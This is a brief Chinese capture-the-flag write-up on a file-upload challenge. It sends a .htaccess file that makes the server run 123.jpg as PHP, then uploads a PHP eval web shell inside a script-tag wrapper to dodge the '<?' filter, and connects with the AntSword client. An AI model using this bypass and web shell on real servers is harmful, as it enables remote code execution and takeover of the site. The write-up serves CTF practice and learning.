#文件上传

这道题的上传限制也就是上传的文件后缀不允许出现 ph、Content-Type=image/jpeg、文件内容中也不允许出现 `<?`

上传.htaccess 配置文件，允许服务器把 123.jpg 文件解析为 php

```htaccess
<FilesMatch "123.jpg">
setHandler application/x-httpd-php
</FilesMatch>
```

上传一个图片马就 123.jpg

```html
<script language="php">
  @eval($_POST['shell']);
</script>
```

之后访问文件，蚁剑连接，flag 在根目录
